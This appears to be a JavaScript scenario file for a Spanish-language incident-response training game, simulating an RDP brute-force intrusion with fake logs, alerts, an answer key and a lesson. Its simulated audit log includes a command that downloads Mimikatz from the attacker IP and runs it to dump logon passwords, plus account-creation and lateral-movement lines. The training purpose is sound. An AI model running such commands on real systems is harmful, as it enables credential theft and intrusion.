import { authLogFuerzaBruta } from "./helpers.js";

export default {
  id: "bruteforce-01",
  titulo: "«Accesos fallidos en masa» — Fuerza bruta RDP con éxito",
  severidad: "ALTA",
  nivel: 3,
  sla: 900, // 15 minutos
  xp: 400,
  briefing:
    "El SIEM ha detectado cientos de intentos de acceso fallidos contra srv-fin-01 " +
    "(servidor financiero) desde una IP externa. Entre el ruido, un acceso terminó en ÉXITO " +
    "y desde entonces se han creado cuentas y tareas programadas nuevas.\n\n" +
    "Esto huele a intrusión en curso con movimiento lateral. Investiga, identifica el alcance " +
    "y responde antes de que el atacante toque datos financieros.",

  fs: {
    "/var/log/auth.log": authLogFuerzaBruta({
      atacante: "45.155.205.33",
      usuario: "Administrator",
      duracion: 4,
      conn: 140,
    }),

    "/var/log/audit/audit.log": [
      "type=USER_CMD msg=audit(2026-02-12T00:03:41): pid=2041 uid=500 auid=500 ses=412 subj=unconfined user='Administrator' cmd='/usr/sbin/useradd -u 2005 svc_support'",
      "type=USER_CMD msg=audit(2026-02-12T00:03:52): pid=2042 uid=500 auid=500 ses=412 user='Administrator' cmd='/usr/bin/passwd svc_support'",
      "type=USER_CMD msg=audit(2026-02-12T00:04:05): pid=2043 uid=500 auid=500 ses=412 user='Administrator' cmd='/bin/systemctl enable svc_scan.timer'",
      "type=USER_CMD msg=audit(2026-02-12T00:04:22): pid=2044 uid=500 auid=500 ses=412 user='svc_support' cmd='/bin/bash -c curl -s http://45.155.205.33:8080/mimikatz.exe -o /tmp/k.exe && chmod +x /tmp/k.exe && /tmp/k.exe sekurlsa::logonpasswords'",
      "type=USER_CMD msg=audit(2026-02-12T00:06:50): pid=2050 uid=2005 auid=2005 ses=415 user='svc_support' cmd='smbclient //10.0.4.22/share -U cibercorp\\\\svc_backup'",
    ].join("\n"),

    "/var/log/systemd/timers.log": [
      "Feb 12 00:04:06 srv-fin-01 systemd[1]: Created slice system-svc_scan.slice.",
      "Feb 12 00:04:07 srv-fin-01 systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/svc_scan.timer → /etc/systemd/system/svc_scan.timer.",
      "Feb 12 00:04:07 srv-fin-01 systemd[1]: Timer svc_scan.timer scheduled (every 5min).",
    ].join("\n"),

    "/opt/siem/alerts.json": JSON.stringify(
      [
        {
          id: "ALT-601",
          sev: "HIGH",
          fuente: "siem",
          ts: "2026-02-12T00:02:20Z",
          titulo: "Fuerza bruta RDP/SSH: 560 intentos fallidos en 4 horas",
          detalle: "Origen 45.155.205.33 contra usuario Administrator en srv-fin-01. Umbral superado.",
          estado: "ABIERTA",
        },
        {
          id: "ALT-602",
          sev: "CRITICAL",
          fuente: "siem",
          ts: "2026-02-12T00:02:16Z",
          titulo: "Acceso con éxito tras fuerza bruta",
          detalle: "Login exitoso de Administrator desde 45.155.205.33 a las 00:02:14 (después de 560 fallos).",
          estado: "ABIERTA",
        },
        {
          id: "ALT-603",
          sev: "CRITICAL",
          fuente: "audit",
          ts: "2026-02-12T00:04:22Z",
          titulo: "Herramienta de robo de credenciales descargada",
          detalle: "Ejecución de /tmp/k.exe (mimikatz) con la cuenta recién creada svc_support.",
          estado: "ABIERTA",
        },
        {
          id: "ALT-604",
          sev: "HIGH",
          fuente: "audit",
          ts: "2026-02-12T00:06:50Z",
          titulo: "Acceso a recurso compartido de otro servidor",
          detalle: "svc_support accede a //10.0.4.22/share con credenciales de svc_backup. Movimiento lateral.",
          estado: "ABIERTA",
        },
      ],
      null,
      2
    ),

    "/home/analista/casos/evidencias/README.txt":
      "Caso #CASE-3311 — intrusión srv-fin-01.\n" +
      "Fuentes: /var/log/auth.log, /var/log/audit/audit.log, /var/log/systemd/timers.log",
  },

  correos: [],
  alertas: [
    { id: "ALT-601", sev: "HIGH", fuente: "siem", titulo: "Fuerza bruta RDP/SSH: 560 intentos fallidos en 4 horas" },
    { id: "ALT-602", sev: "CRITICAL", fuente: "siem", titulo: "Acceso con éxito tras fuerza bruta" },
    { id: "ALT-603", sev: "CRITICAL", fuente: "audit", titulo: "Herramienta de robo de credenciales descargada" },
    { id: "ALT-604", sev: "HIGH", fuente: "audit", titulo: "Acceso a recurso compartido de otro servidor" },
  ],

  dominios: {},
  ips: {
    "45.155.205.33": {
      pais: "🇷🇺 Rusia (ASN hosting)",
      asn: "AS44477 (infraestructura anónima)",
      reputacion: "MALICIOSA — origen conocido de campañas de fuerza bruta RDP, listada en 11 blacklists.",
      nota: "Escaneo masivo de RDP/SSH. Sin registrante real (proveedor de alto riesgo).",
    },
    "10.0.4.22": {
      pais: "🏢 Red interna",
      asn: "Interno",
      reputacion: "Servidor interno srv-backup-01. El acceso desde svc_support es anómalo.",
    },
  },

  urls: {
    "http://45.155.205.33:8080/mimikatz.exe":
      "HTTP/1.1 200 OK — binario PE32 (ejecutable Windows x64) ~ 1.2 MB. Nombre conocido: Mimikatz, herramienta de robo de credenciales en memoria.",
  },

  correctas: {
    bloquear: ["ip:45.155.205.33"],
    aislar: ["host:srv-fin-01"],
    deshabilitar: ["usuario:svc_support", "usuario:Administrator"],
    escalar: true,
    cerrar: false,
  },

  incorrectas: [
    "bloquear|ip:10.0.4.22",
    "deshabilitar|usuario:svc_backup",
  ],

  eventos: [
    {
      en: 180,
      tipo: "alerta",
      sev: "CRITICAL",
      titulo: "Exfiltración de credenciales detectada",
      detalle: "svc_support intenta conexión saliente a 45.155.205.33:4444 (exfiltración de hashes).",
    },
    {
      en: 420,
      tipo: "msg",
      titulo: "Responsable de servidores",
      detalle: "«El RDP está expuesto a Internet desde un cambio de configuración del mes pasado. Confirmo que srv-fin-01 no debe tener RDP público.»",
    },
  ],

  // Ataque adaptativo: si no bloqueas la IP del atacante en ~3 minutos,
  // reutiliza las credenciales robadas, compromete otra cuenta de servicio
  // y otro servidor (objetivos nuevos exigidos).
  pivot: {
    en: 200,
    siNo: "bloquear:ip:45.155.205.33",
    correctas: { deshabilitar: ["usuario:svc_backup"], aislar: ["host:srv-rrhh-01"] },
    alerta: {
      sev: "HIGH",
      titulo: "Pivote: svc_backup comprometida y srv-rrhh-01 accedido",
      detalle: "Sin bloquear la IP, el atacante reutiliza las credenciales robadas: svc_backup inicia sesión desde 45.155.205.33 y srv-rrhh-01 muestra acceso administrativo anómalo.",
    },
    detalle: "No bloqueas la IP del atacante a tiempo: ha pivotado a otra cuenta de servicio y a otro servidor.",
    penalizacion: 35,
  },

  pistas: [
    "Mira el auth.log: cuenta el patrón (grep). ¿Quién entra y desde dónde?",
    "La alerta ALT-602 ya te dice que hubo un login con éxito. ¿Qué hizo después? Revisa audit.log.",
    "La cuenta svc_support es nueva y ejecuta herramientas ofensivas. ¿De dónde salió?",
    "Responde: bloquea la IP, aísla el servidor, deshabilita las cuentas comprometidas y escala.",
  ],

  leccion: {
    titulo: "Fuerza bruta, credenciales y movimiento lateral",
    mitre: ["T1110.001", "T1110.003", "T1078", "T1003.001", "T1021.002", "T1053"],
    resumen:
      "El atacante golpeó RDP/SSH expuesto a Internet con fuerza bruta sobre la cuenta Administrator " +
      "durante 4 horas y 560 intentos hasta acertar. Con acceso creó una cuenta de servicio (svc_support), " +
      "descargó Mimikatz para robar credenciales en memoria y saltó a otro servidor usando las credenciales " +
      "robadas. Lo que empezó como un escaneo terminó en movimiento lateral dentro de la red financiera.",
    deteccion:
      "- Volumen anómalo de 'Failed password' contra una única cuenta (fuerza bruta).\n" +
      "- Login con éxito precedido de cientos de fallos: casi nunca es legítimo.\n" +
      "- Cuentas nuevas creadas fuera de los procesos de provisión (useradd svc_support).\n" +
      "- Descarga y ejecución de herramientas de post-explotación (Mimikatz).\n" +
      "- Accesos a recursos compartidos con cuentas de otras máquinas (movimiento lateral).",
    respuesta:
      "1. Bloquear la IP de origen en el firewall y prohibir RDP/SSH público (o ponerlo tras VPN + MFA).\n" +
      "2. Aislar el servidor comprometido y deshabilitar las cuentas tocadas (Administrator, svc_support).\n" +
      "3. Asumir credenciales comprometidas: rotar TODAS las que pasaron por la sesión.\n" +
      "4. Buscar movimiento lateral: ¿a qué más máquinas llegó svc_support?\n" +
      "5. Revisar tareas programadas nuevas (svc_scan.timer) para asegurar persistencia.\n" +
      "6. Escalar a CSIRT y documentar alcance.",
    aprendizaje: [
      "Exponer RDP/SSH a Internet es invitar a la fuerza bruta: usa VPN, MFA y bloqueo de cuenta.",
      "La cuenta Administrator/root nunca debería ser la primera línea: usa cuentas sin privilegios + elevación.",
      "Un solo login con éxito entre miles de fallos ya es incidente: mira siempre el log completo.",
      "Mimikatz roba credenciales de memoria: limpiar contraseñas en claro y usar LAPS/credenciales dedicadas.",
      "El movimiento lateral es la fase donde se decide el daño: cortar rápido evita que alcance los datos.",
    ],
    glosario: ["Fuerza bruta", "Mimikatz", "Movimiento lateral", "Persistencia", "MFA", "RDP", "Credential dumping"],
  },
};
